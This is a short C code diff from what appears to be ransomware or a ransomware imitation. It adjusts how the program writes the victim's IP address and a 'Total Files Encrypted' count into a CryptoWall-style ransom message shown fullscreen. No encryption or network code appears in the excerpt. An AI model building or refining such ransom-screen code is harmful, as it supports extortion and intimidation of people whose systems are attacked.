@@ -122,16 +122,24 @@ int main() {
   fclose(loadip);
 
   /// ADD IP
-  fseek(cryptowall, 1163, SEEK_SET);
+  fseek(cryptowall, 1200, SEEK_SET);
   // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
-  char buffer[16] = "               ";
-  int pad = sprintf(buffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
-  buffer[pad] = ' '; // Remove '\0' set by sprintf
-  fwrite(buffer, sizeof(char), 15, cryptowall);
+  char ipbuffer[16] = "               ";
+  int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
+  ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
+  fwrite(ipbuffer, sizeof(char), 15, cryptowall);
 
   /// ADD Total Files Encrypted
-  fseek(cryptowall, 1331, SEEK_SET);
-  fprintf(cryptowall, "%1u,%03u", cant_files / 1000, cant_files % 1000);
+  fseek(cryptowall, 1361, SEEK_SET);
+  char cfbuffer[32];
+  strcpy(cfbuffer, "      ");
+  int cf_pad;
+  if (cant_files > 1000)
+    cf_pad = sprintf(cfbuffer, "%u,%03u", cant_files / 1000, cant_files % 1000);
+  else
+    cf_pad = sprintf(cfbuffer, "%u", cant_files % 1000);
+  cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
+  fwrite(cfbuffer, sizeof(char), 6, cryptowall);
   fclose(cryptowall);
 
   /// SHOW MESSAGE FULLSCREEN
